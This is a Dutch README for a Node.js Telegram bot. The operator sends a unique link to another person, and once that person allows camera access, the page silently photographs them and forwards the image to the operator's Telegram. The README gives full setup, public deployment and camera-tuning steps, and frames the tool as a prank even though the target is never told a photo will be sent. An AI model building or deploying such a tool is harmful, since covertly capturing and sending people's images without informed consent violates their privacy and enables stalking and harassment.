# 📸 Telegram Camera Bot

Een Telegram bot die automatisch een foto maakt via de camera van de gebruiker zodra deze toestemming geeft.

## 🎯 Functionaliteit

1. Gebruiker klikt op een unieke link
2. Browser vraagt om camera toestemming
3. Zodra toegestaan, wordt automatisch een foto gemaakt
4. Foto wordt direct naar jou gestuurd via Telegram
5. Geen knoppen of extra stappen nodig!

## 📋 Vereisten

- Node.js (versie 14 of hoger)
- Een Telegram account
- Internet verbinding

## 🚀 Installatie

### Stap 1: Telegram Bot aanmaken

**Dit moet je EERST doen voordat je de code installeert!**

#### A. Maak een bot aan via BotFather

1. Open **Telegram** op je telefoon of computer
2. Zoek naar **@BotFather** (officiële bot van Telegram, met blauw vinkje ✓)
3. Start een chat en stuur: `/start`
4. Stuur het commando: `/newbot`
5. BotFather vraagt: "Alright, a new bot. How are we going to call it?"
   - Geef je bot een **naam** (bijv. "Prank Camera Bot")
6. BotFather vraagt: "Good. Now let's choose a username for your bot."
   - Geef je bot een **username** die eindigt op `bot` (bijv. "mycamera_prank_bot")
7. **SUCCES!** Je krijgt een bericht met je Bot Token:
   ```
   Done! Congratulations on your new bot...
   Use this token to access the HTTP API:
   1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
   ```
8. **Kopieer deze token** en bewaar hem veilig! ⚠️

#### B. Haal je eigen Telegram ID op

1. Zoek in Telegram naar **@userinfobot** (of **@myidbot**)
2. Start een chat en stuur een willekeurig bericht (bijv. "/start" of "hoi")
3. Je krijgt een bericht terug met je informatie:
   ```
   Your user ID: 123456789
   ```
4. **Noteer dit nummer** - dit is jouw Telegram ID!

### Stap 2: Dependencies installeren

Nu gaan we de code installeren:

```bash
cd "telegram bot"
npm install
```

Dit installeert alle benodigde packages (Express, Telegram Bot API, etc.)

### Stap 3: .env bestand aanmaken

Kopieer `.env.example` naar `.env`:

```bash
cp .env.example .env
```

Open `.env` en vul je gegevens in:

```
BOT_TOKEN=1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
YOUR_TELEGRAM_ID=123456789
PORT=3000
PUBLIC_URL=http://localhost:3000
```

**Vul in:**
- `BOT_TOKEN` = De token die je van @BotFather kreeg
- `YOUR_TELEGRAM_ID` = Je user ID van @userinfobot
- `PORT` = Laat staan op 3000 (of kies een andere)
- `PUBLIC_URL` = Voor nu localhost, later je echte domein

## ▶️ Starten

### Lokaal testen

```bash
npm start
```

Of met auto-reload tijdens development:

```bash
npm run dev
```

Je ziet dan:

```
==================================================
📸 Telegram Camera Bot gestart!
==================================================
Server draait op: http://localhost:3000
Port: 3000
Bot Token: 1234567890...
Jouw Telegram ID: 123456789
==================================================

✓ Bot is klaar voor gebruik!
  Stuur /start naar de bot op Telegram om te beginnen.
```

## 📱 Gebruik

### Links genereren

1. Open je bot in Telegram
2. Stuur `/start` of `/nieuw`
3. Je krijgt een unieke link
4. Stuur deze link naar de persoon van wie je een foto wilt

### Wat gebeurt er?

1. Persoon opent de link op hun telefoon/laptop
2. Browser vraagt: "Toestemming voor camera?"
3. Bij toestemming: automatisch foto gemaakt
4. Foto wordt naar jou gestuurd via Telegram
5. Klaar! ✓

## ✅ Test of het werkt

1. Zoek je bot op in Telegram (de username die je hebt gemaakt)
2. Klik op **Start** of stuur `/start`
3. Je bot zou moeten reageren met een camera link!
4. Test de link op je telefoon
5. Geef camera toestemming
6. Je krijgt "GEPRANKT!" te zien
7. Check je Telegram - je zou de foto moeten ontvangen! 📸

## 🌐 Online zetten (Productie)

Voor productie heb je een publieke URL nodig. Opties:

### Optie 1: Railway (Aanbevolen - Gratis tier beschikbaar) 🚂

**Nieuwe webhook-compatible versie!** De bot ondersteunt nu automatisch Railway deployment.

1. Ga naar [railway.app](https://railway.app) en maak een account
2. Klik op "New Project" → "Deploy from GitHub repo"
3. Selecteer deze repository
4. Voeg de volgende environment variables toe:
   - `BOT_TOKEN` = Je bot token van @BotFather
   - `YOUR_TELEGRAM_ID` = Je Telegram user ID
   - `USE_WEBHOOK` = `true`
   - `WEBHOOK_URL` = De Railway URL (wordt automatisch gegenereerd)
5. Deploy! Railway detecteert automatisch webhook mode.

**Zie [RAILWAY_SETUP.md](RAILWAY_SETUP.md) voor gedetailleerde instructies.**

### Optie 2: Ngrok (Snel voor testen)

1. Download ngrok: https://ngrok.com/
2. Start je bot: `npm start`
3. In een nieuwe terminal: `ngrok http 3000`
4. Kopieer de https URL (bijv. `https://abc123.ngrok.io`)
5. Update `PUBLIC_URL` in `.env` met deze URL
6. Herstart de bot

### Optie 2: VPS (DigitalOcean, Linode, etc.)

1. Upload je code naar de server
2. Installeer Node.js
3. Run `npm install`
4. Configureer `.env` met je server URL
5. Gebruik PM2 voor process management:
   ```bash
   npm install -g pm2
   pm2 start server.js --name camera-bot
   pm2 save
   pm2 startup
   ```

### Optie 3: Hosting platforms

- **Heroku**: Gratis tier beschikbaar
- **Railway**: Moderne hosting
- **Render**: Gratis SSL inbegrepen
- **Vercel/Netlify**: Voor serverless deployment

## 🔧 Commando's

- `/start` - Genereer een nieuwe camera link
- `/nieuw` - Genereer nog een link
- `/health` (in browser) - Check of server draait

## ⚙️ Configuratie opties

### .env variabelen

| Variabele | Verplicht | Beschrijving |
|-----------|-----------|--------------|
| `BOT_TOKEN` | ✅ | Je Telegram bot token van @BotFather |
| `YOUR_TELEGRAM_ID` | ✅ | Je Telegram user ID van @userinfobot |
| `PORT` | ❌ | Server port (default: 3000) |
| `PUBLIC_URL` | ❌ | Publieke URL (default: localhost) |

## 📁 Projectstructuur

```
telegram bot/
├── server.js           # Hoofdbestand met bot + server logica
├── package.json        # Dependencies
├── .env               # Configuratie (niet in git)
├── .env.example       # Voorbeeld configuratie
├── .gitignore         # Git ignore regels
└── README.md          # Deze instructies
```

## 🔒 Beveiliging

- **Sessies**: Elke link werkt maar 1x en verloopt na 30 minuten
- **API Key**: Zet nooit je `.env` bestand in git
- **HTTPS**: Gebruik altijd HTTPS in productie (voor camera toegang)
- **Validatie**: Alle sessies worden gevalideerd

## 🐛 Problemen oplossen

### "Camera toegang geweigerd"
- Gebruiker moet handmatig toestemming geven
- Op iOS: Settings → Safari → Camera
- Op Android: Browser instellingen → Site permissions

### "Ongeldige of verlopen sessie"
- Link is al gebruikt of ouder dan 30 minuten
- Genereer een nieuwe link met `/nieuw`

### Bot reageert niet
- Check of `BOT_TOKEN` correct is in `.env`
- Controleer internet verbinding
- Kijk naar console voor errors

### Foto's komen niet aan
- Check of `YOUR_TELEGRAM_ID` correct is
- Test eerst met `/start` in de bot
- Controleer of bot toegang heeft tot je chat

### "Cannot find module"
- Run `npm install` opnieuw
- Check of je in de juiste folder zit

## 📊 Status checken

Ga naar `http://localhost:3000/health` in je browser om te zien:

```json
{
  "status": "ok",
  "activeSessions": 2,
  "uptime": 3600
}
```

## 🤝 Tips

1. **Meerdere links**: Je kunt meerdere links tegelijk actief hebben
2. **Eenmalig gebruik**: Elke link werkt maar 1 keer (veiligheid)
3. **HTTPS verplicht**: Camera werkt alleen op HTTPS (behalve localhost)
4. **Mobile first**: Werkt het beste op smartphones
5. **Snelheid**: Foto wordt 2 seconden na toestemming gemaakt

## 📝 Features

- ✅ Automatische foto na camera toestemming
- ✅ Geen knoppen nodig
- ✅ Directe verzending naar Telegram
- ✅ Sessie management
- ✅ Link verloopt automatisch
- ✅ Eenmalig gebruik per link
- ✅ Responsive design
- ✅ Error handling
- ✅ Auto cleanup oude sessies

## 🎨 Aanpassingen

### Camera resolutie wijzigen

In `server.js`, zoek naar:

```javascript
video: {
    facingMode: 'user',
    width: { ideal: 1280 },
    height: { ideal: 720 }
}
```

Wijzig de width/height naar gewenste resolutie.

### Front/back camera

Wijzig `facingMode`:
- `'user'` = front camera (selfie)
- `'environment'` = back camera

### Wachttijd voor foto

Zoek naar:

```javascript
await new Promise(resolve => setTimeout(resolve, 2000));
```

Wijzig `2000` (milliseconden) naar gewenste wachttijd.

## 📄 Licentie

ISC - Gebruik naar eigen inzicht!

## 🆘 Support

Bij vragen of problemen:
1. Check de console logs
2. Controleer `.env` configuratie
3. Test eerst lokaal voor online te gaan
4. Zorg dat HTTPS actief is in productie

---

**Succes met je Camera Bot! 📸**